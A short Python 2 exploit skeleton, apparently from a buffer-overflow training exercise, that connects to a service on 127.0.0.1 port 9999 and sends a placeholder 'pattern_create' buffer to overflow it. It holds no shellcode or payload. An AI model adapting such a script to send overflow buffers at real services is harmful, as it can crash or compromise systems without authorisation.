#!/usr/bin/python

import socket

buffer="insert pattern_create string here"


s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    print "\nSending malicious buffer...."
    s.connect(('127.0.0.1', 9999))
    data = s.recv(1024)
    s.send(buffer + '\r\n')
    print "\nOverflowed"
except:
    print "could not connect to application"
